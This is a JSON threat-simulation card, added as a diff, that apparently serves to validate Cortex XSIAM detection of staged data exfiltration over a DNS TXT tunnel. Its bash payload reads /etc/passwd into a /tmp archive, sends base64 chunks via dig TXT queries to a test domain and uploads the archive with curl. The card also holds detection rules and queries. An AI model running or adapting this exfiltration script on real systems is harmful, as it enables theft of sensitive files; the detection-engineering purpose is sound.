@@ -1,0 +1,410 @@
+{
+  "id": "TTP-2026-0048",
+  "schema_version": "1.0.0",
+  "entry_version": "1.0.0",
+  "status": "active",
+  "metadata": {
+    "created_at": "2026-05-20T21:16:12+00:00",
+    "updated_at": "2026-06-02",
+    "authors": [
+      {
+        "name": "CortexSim generate_card.py",
+        "role": "author"
+      },
+      {
+        "name": "Henry Reed",
+        "email": "hreed@paloaltonetworks.com",
+        "role": "reviewer"
+      }
+    ],
+    "tags": [
+      "plane-analytics",
+      "multi-plane-stitch",
+      "xdr-ngfw-correlation",
+      "vector-dns-tunnel-exfil",
+      "industry-all",
+      "severity-high",
+      "analytics"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-UNIT42"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": true,
+      "simulation_class": "ransomware-chain",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux"
+      ],
+      "estimated_runtime_seconds": 120,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Staged Data Exfiltration via DNS Tunnel \u2014 XDR Staging + NGFW Stitch (T1048.003)",
+    "summary": "A service account harvests sensitive local files, archives them into a /tmp tarball, then exfiltrates the base64 chunks over a high-entropy DNS TXT tunnel (with an HTTPS-POST fallback). The Cortex value is end-to-end stitching: XSIAM joins the XDR staging leg (passwd read -> tar -> dig loop in xdr_data) to the NGFW DNS-anomaly leg (TXT burst in pan_dns) on the same hostname, turning two plausib\u2026",
+    "description": "This scenario validates XSIAM correlation on the staged-exfiltration kill chain where the collection/staging stages are visible only to the endpoint and the covert-channel egress is visible only to the network. Cortex XDR (xdr_data) observes the /etc/passwd read concatenated into a /tmp staging file, the tar+gzip of that staging directory, and the dig TXT loop. The NGFW DNS plane (pan_dns / network_story) observes the sustained TXT query burst with high-entropy 60-char labels and the >10x query-rate spike from a single source. Independently each looks like routine admin activity or noisy DNS; stitched on the shared hostname inside the correlation window they form a textbook T1074.001 -> T1572 -> T1048.003 exfiltration story. The card also covers the redundant HTTPS-POST exfil leg (curl -F upload + NGFW POST to the IOC domain) so the POV shows two independent egress channels converging on the same staged-data hash. All targets are 3CORESec testmynids.org test indicators \u2014 safe by design.",
+    "severity": "high",
+    "confidence": "high"
+  },
+  "threat_context": {
+    "actors": [],
+    "campaigns": [],
+    "malware_families": [
+      {
+        "name": "iodine / dnscat2-class tunnelers"
+      }
+    ],
+    "industries_targeted": [
+      "technology"
+    ],
+    "first_observed": "2014-01-01"
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1048",
+        "name": "Exfiltration Over Alternative Protocol: Over Unencrypted Non-C2 Protocol",
+        "tactic_ids": [
+          "TA0010"
+        ],
+        "tactic_names": [
+          "Exfiltration"
+        ],
+        "subtechnique_id": "T1048.003"
+      },
+      {
+        "technique_id": "T1074",
+        "name": "Data Staged: Local Data Staging",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ],
+        "subtechnique_id": "T1074.001"
+      },
+      {
+        "technique_id": "T1572",
+        "name": "Protocol Tunneling",
+        "tactic_ids": [
+          "TA0011"
+        ],
+        "tactic_names": [
+          "Command and Control"
+        ]
+      },
+      {
+        "technique_id": "T1005",
+        "name": "Data from Local System",
+        "tactic_ids": [
+          "TA0009"
+        ],
+        "tactic_names": [
+          "Collection"
+        ]
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": [
+      "Process: Process Creation",
+      "Command: Command Execution",
+      "File: File Access",
+      "File: File Creation",
+      "Network Traffic: Network Connection Creation",
+      "Network Traffic: Network Traffic Content"
+    ]
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "atomic-red-team",
+    "framework_reference_id": "T1048.003 / T1074.001 \u2014 Atomic Tests (local staging + DNS exfiltration over TXT)",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Cortex XDR Linux agent installed and reporting healthy on the source host.",
+        "check_command": "systemctl is-active cortex-agent || ps aux | grep -i traps"
+      },
+      {
+        "description": "NGFW (or Suricata lab) forwarding DNS + session logs to XSIAM so pan_dns / pan_ngfw_traffic receive the tunnel and HTTPS-POST legs.",
+        "check_command": "echo 'verify pan_dns dataset is receiving logs in XSIAM'"
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# All targets are 3CORESec testmynids.org test indicators \u2014 safe by design.\nmkdir -p /tmp/cortexsim_stage\necho '# Simulated credential file - NOT real credentials' > /tmp/cortexsim_stage/creds.txt\nfor i in 1 2 3 4 5; do echo \"user$i:simulated-hash-$(openssl rand -hex 16)\" >> /tmp/cortexsim_stage/creds.txt; done\ncat /etc/passwd | head -20 >> /tmp/cortexsim_stage/creds.txt\ntar -czf /tmp/cortexsim_stage/bundle.tar.gz /tmp/cortexsim_stage/creds.txt 2>/dev/null\nB64=$(base64 -w 0 /tmp/cortexsim_stage/bundle.tar.gz | head -c 2000)\nfor i in $(seq 0 $((${#B64}/60))); do chunk=$(echo -n \"$B64\" | cut -c$((i*60+1))-$(((i+1)*60))); [ -z \"$chunk\" ] && break; dig +short TXT \"$(echo -n \"$chunk\" | tr -d = | tr '/+' '-_').exfil.testmynids.org\" @1.1.1.1 > /dev/null || true; sleep 0.5; done\ncurl -sSL -m 15 -X POST -F \"data=@/tmp/cortexsim_stage/bundle.tar.gz\" \"http://testmynids.org/uid/index.html\" 2>/dev/null | head -5 || true",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "file",
+        "description": "/etc/passwd read then concatenated into the /tmp staging file.",
+        "expected_value": "action_file_path = \"/etc/passwd\" and event_sub_type = ENUM.FILE_OPEN"
+      },
+      {
+        "artifact_type": "process",
+        "description": "tar invoked with -czf against the /tmp staging directory.",
+        "expected_value": "actor_process_image_name = \"tar\" and command_line contains \"/tmp/cortexsim_stage\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "dig invoked in a loop producing TXT queries with high-entropy labels.",
+        "expected_value": "actor_process_image_name = \"dig\" and command_line contains \".exfil.testmynids.org\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "High volume of DNS TXT queries to *.exfil.testmynids.org.",
+        "expected_value": "dns_query_type = \"TXT\" and dns_query_name contains \".exfil.testmynids.org\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "HTTPS POST with multipart file upload to the IOC domain.",
+        "expected_value": "dst_host = \"testmynids.org\" and http_method = \"POST\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "rm -rf /tmp/cortexsim_stage\necho '[CortexSim] SIM-MP-003 cleanup complete'"
+    }
+  },
+  "detections": {
+    "iocs": [
+      {
+        "ioc_type": "domain",
+        "value": "testmynids.org",
+        "context": "3CORESec test indicator used as both the DNS-tunnel parent domain (*.exfil.testmynids.org) and the HTTPS-POST exfil endpoint. The IOC match on the POST destination is cross-referenced with the staged-data hash to confirm the same bundle left over two channels."
+      }
+    ],
+    "biocs": [
+      {
+        "name": "MP-003 Passwd Read Then Write To Tmp Staging Dir",
+        "description": "XDR - /etc/passwd read followed by write to /tmp staging directory. The collection leg: a sensitive system file is read and concatenated into a staging file under /tmp.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE\n| filter event_sub_type in (ENUM.FILE_OPEN, ENUM.FILE_READ)\n| filter action_file_path in (\"/etc/passwd\", \"/etc/shadow\")\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"apache\", \"nginx\")\n| filter actor_process_image_name in (\"cat\", \"head\", \"cp\", \"dd\", \"bash\", \"sh\")",
+        "severity": "medium",
+        "mitre_technique_ids": [
+          "T1005"
+        ]
+      },
+      {
+        "name": "MP-003 Tar Gzip Compression Of Tmp Staging By Service Account",
+        "description": "XDR - data staging: tar compression of recently-written files in /tmp by service account. Classic exfil-prep: a service identity archives the staging directory.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"tar\", \"gzip\", \"zip\", \"7z\")\n| filter action_process_image_command_line contains \"/tmp/\"\n| filter action_process_image_command_line contains_any (\"-czf\", \"-cf\", \"-z\", \".tar.gz\")\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"apache\", \"nginx\")",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1074.001"
+        ]
+      },
+      {
+        "name": "MP-003 Dig TXT Tight Loop From Service Account",
+        "description": "XDR - dig invocation in tight loop from service account (shell one-liner DNS exfil). The endpoint process leg of the DNS tunnel that the NGFW DNS anomaly lacks.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"dig\", \"nslookup\", \"host\")\n| filter action_process_image_command_line contains \"TXT\"\n| filter action_process_image_command_line contains_any (\".exfil.\", \"@1.1.1.1\", \"@8.8.8.8\")\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"apache\", \"nginx\")",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1048.003"
+        ]
+      },
+      {
+        "name": "MP-003 Curl Form Upload Of Staged Data By Service Account",
+        "description": "XDR - curl -F file upload of recently-staged data by service account. The redundant HTTPS-POST exfil channel: curl uploads the staged tarball as multipart form data.",
+        "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter actor_process_image_name in (\"curl\", \"wget\")\n| filter action_process_image_command_line contains_any (\"-F \", \"--form\", \"-X POST\", \"--data-binary\")\n| filter action_process_image_command_line contains \"@/tmp/\"\n| filter actor_effective_username in (\"www-data\", \"nobody\", \"apache\", \"nginx\")",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1048"
+        ]
+      }
+    ],
+    "xql_queries": [
+      {
+        "purpose": "validation",
+        "name": "MP-003 Sensitive File Path Access From Service Account",
+        "query": "preset = xdr_data\n| filter _time > to_timestamp(current_time() - 1800)\n| filter event_type = ENUM.FILE and event_sub_type in (ENUM.FILE_OPEN, ENUM.FILE_READ)\n| filter action_file_path in (\"/etc/passwd\", \"/etc/shadow\", \"/etc/sudoers\")\n| filter actor_effective_username != \"root\"\n| fields _time, agent_hostname, actor_effective_username, actor_process_image_name, action_file_path",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-003 NGFW DNS TXT Tunneling Burst High Entropy Labels",
+        "query": "dataset = pan_dns\n| filter _time > to_timestamp(current_time() - 1800)\n| filter dns_query_type = \"TXT\" and dns_query_name contains \".exfil.testmynids.org\"\n| comp count() as txt_queries, count_distinct(dns_query_name) as distinct_labels, avg(len(dns_query_name)) as avg_label_len by source_ip\n| filter txt_queries >= 10 and avg_label_len > 40\n| fields source_ip, txt_queries, distinct_labels, avg_label_len",
+        "expected_rows_min": 1,
+        "dataset": "pan_dns"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-003 NGFW DNS Query Rate Spike From Single Source",
+        "query": "dataset = pan_dns\n| filter _time > to_timestamp(current_time() - 1800)\n| filter dns_query_name contains \"testmynids.org\"\n| comp count() as query_count by source_ip, bin(_time, 1m) as minute\n| filter query_count >= 10\n| fields minute, source_ip, query_count",
+        "expected_rows_min": 1,
+        "dataset": "pan_dns"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-003 Stitch Tmp Stage Write With DNS Tunnel Burst",
+        "query": "dataset = xdr_data\n| filter _time > to_timestamp(current_time() - 1800)\n| filter (event_type = ENUM.PROCESS and actor_process_image_name in (\"tar\", \"dig\")) or (event_type = ENUM.NETWORK and action_external_port = 53)\n| comp count_distinct(_product) as plane_count, count_distinct(incident_id) as incident_count, min(_time) as first_seen, max(_time) as last_seen by agent_hostname\n| filter plane_count >= 2 and incident_count = 1\n| fields agent_hostname, plane_count, incident_count, first_seen, last_seen",
+        "expected_rows_min": 1,
+        "dataset": "xdr_data"
+      },
+      {
+        "purpose": "validation",
+        "name": "MP-003 NGFW HTTP Post File Upload To IOC Domain",
+        "query": "dataset = pan_ngfw_traffic\n| filter _time > to_timestamp(current_time() - 1800)\n| filter dst_host = \"testmynids.org\" and http_method = \"POST\"\n| comp count() as post_hits, sum(bytes_sent) as bytes_out by source_ip, dst_host\n| fields source_ip, dst_host, post_hits, bytes_out",
+        "expected_rows_min": 1,
+        "dataset": "pan_ngfw_traffic"
+      }
+    ],
+    "correlation_rules": [
+      {
+        "name": "Staged DNS Exfil Cross-Plane Stitch \u2014 XDR Staging + NGFW DNS Anomaly",
+        "rule_id": "CR-MP-0004",
+        "logic": "(BIOC(MP-003 Tar Gzip Compression Of Tmp Staging By Service Account) AND BIOC(MP-003 Dig TXT Tight Loop From Service Account) AND XQL(MP-003 NGFW DNS TXT Tunneling Burst High Entropy Labels)) -> join on hostname within 60s"
+      },
+      {
+        "name": "DNS Rate Spike Plus Sensitive Read Stitch",
+        "rule_id": "CR-MP-0005",
+        "logic": "(BIOC(MP-003 Passwd Read Then Write To Tmp Staging Dir) AND XQL(MP-003 NGFW DNS Query Rate Spike From Single Source)) -> join on hostname within 120s"
+      },
+      {
+        "name": "Redundant HTTPS Exfil IOC Stitch \u2014 Curl Upload + NGFW POST + IOC",
+        "rule_id": "CR-MP-0006",
+        "logic": "(BIOC(MP-003 Curl Form Upload Of Staged Data By Service Account) AND XQL(MP-003 NGFW HTTP Post File Upload To IOC Domain) AND IOC(domain: testmynids.org)) -> join on src_host within 60s"
+      }
+    ],
+    "analytics_modules": [
+      "Cortex XSIAM Analytics \u2014 DNS tunneling / high-entropy TXT label detection",
+      "Cortex XSIAM Analytics \u2014 DNS query-rate spike per source",
+      "Cortex XSIAM Correlation Engine \u2014 staging-to-egress causality stitch by hostname"
+    ]
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-xsiam",
+        "submodule": "analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-AN-DNS-TUNNEL-002",
+          "XSIAM-AN-DNS-RATE-SPIKE-001"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "dataset = pan_dns | filter dns_query_type = \"TXT\" and dns_query_name contains \".exfil.testmynids.org\" | comp count() as q by source_ip | filter q >= 10"
+      },
+      {
+        "module": "cortex-xsiam",
+        "submodule": "correlation",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XSIAM-CR-MP-0004",
+          "XSIAM-CR-MP-0005",
+          "XSIAM-CR-MP-0006"
+        ],
+        "license_required": "advanced",
+        "evidence_query": "Correlation CR-MP-0004/0005/0006 join the XDR staging legs to the NGFW DNS/HTTPS exfil legs on hostname/src_host within the window."
+      },
+      {
+        "module": "cortex-xdr",
+        "submodule": "behavioral-analytics",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "XDR-BIOC-MP-0048-TAR",
+          "XDR-BIOC-MP-0048-DIG",
+          "XDR-BIOC-MP-0048-PASSWD"
+        ],
+        "agent_version_min": "8.4.0",
+        "license_required": "pro",
+        "evidence_query": "preset = xdr_data | filter actor_process_image_name = \"dig\" and action_process_image_command_line contains \".exfil.\" | fields _time, agent_hostname, action_process_image_command_line"
+      },
+      {
+        "module": "cortex-xsoar",
+        "coverage_tier": "response",
+        "rule_ids": [
+          "XSOAR-PB-DNSExfilStitchResponse-v1"
+        ],
+        "license_required": "base",
+        "evidence_query": "Playbook isolates the host, sinkholes the tunnel parent domain, and quarantines the /tmp staging artifacts."
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-MP-003",
+        "name": "Cross-Plane Incident Stitching \u2014 Endpoint Staging Through Network Covert Channel",
+        "description": "Validate that XSIAM stitches the XDR staging stages and the NGFW DNS-tunnel egress into a single exfiltration incident with stage-to-tunnel MTTD.",
+        "test_cases": [
+          {
+            "test_case_id": "TC-MP-003A",
+            "objective": "Each plane fires (XDR tar/dig BIOCs + NGFW DNS anomaly XQL).",
+            "preconditions": [
+              "Cortex XDR Linux agent >= 8.4.0 healthy on the source host.",
+              "NGFW (or Suricata) forwarding DNS logs into XSIAM."
+            ],
+            "steps": [
+              "Run SIM-MP-003 steps 1-4.",
+              "Confirm the XDR tar/dig BIOCs and the NGFW DNS-burst XQL each return rows."
+            ],
+            "success_criteria": [
+              "BIOC `MP-003 Tar Gzip Compression Of Tmp Staging By Service Account` fires within 60s.",
+              "XQL `MP-003 NGFW DNS TXT Tunneling Burst High Entropy Labels` returns >= 1 row."
+            ],
+            "expected_score_weight": 0.5
+          },
+          {
+            "test_case_id": "TC-MP-003B",
+            "objective": "Staging and tunnel legs stitch into one incident with measurable MTTD.",
+            "success_criteria": [
+              "Correlation `CR-MP-0004` groups the staging and tunnel legs on hostname into one incident_id.",
+              "Stitch XQL returns plane_count >= 2 and incident_count = 1."
+            ],
+            "expected_score_weight": 0.5
+          }
+        ]
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "preventive_controls": [
+      "Enable NGFW DNS Security to detect and sinkhole tunneling / high-entropy label domains inline.",
+      "Default-deny egress; force DNS through inspected resolvers and block direct queries to public resolvers from servers.",
+      "Restrict service-account read access to /etc/passwd, /etc/shadow and other credential stores.",
+      "Enable Cortex XDR data-collection + exfiltration BTP on server tiers."
+    ],
+    "detection_engineering": [
+      "Correlate endpoint staging (tar/gzip of recently-written sensitive files) with network covert-channel egress on a shared host within a tight window.",
+      "Alert on dig/nslookup loops producing high-entropy TXT labels and on >10x DNS query-rate spikes per source.",
+      "Track redundant exfil channels: cross-reference the HTTPS-POST destination IOC with the staged-data hash to confirm the same bundle left twice."
+    ],
+    "response_playbook": "XSOAR-PB-DNSExfilStitchResponse-v1"
+  },
+  "references": [
+    {
+      "title": "Unit42 - DNS Tunneling: How DNS Can Be (Ab)used",
+      "url": "https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused/",
+      "publisher": "Unit 42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1048.003 \u2014 Exfiltration Over Unencrypted Non-C2 Protocol",
+      "url": "https://attack.mitre.org/techniques/T1048/003/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-05-20",
+      "author": "CortexSim generate_card.py",
+      "change": "Initial draft auto-generated from scenario SIM-MP-003."
+    },
+    {
+      "entry_version": "1.0.0",
+      "date": "2026-06-02",
+      "author": "Henry Reed",
+      "change": "Replaced skeleton detections with real cross-plane stitching content: 4 XDR BIOCs (passwd read, tar staging, dig loop, curl upload), 5 validation XQL (XDR + NGFW DNS/HTTPS legs + stitch), 1 IOC, and 3 correlation rules CR-MP-0004/0005/0006 joining XDR staging to NGFW egress on hostname/src_host. Enriched identity + panw_mapping. Promoted to active."
+    }
+  ]
+}
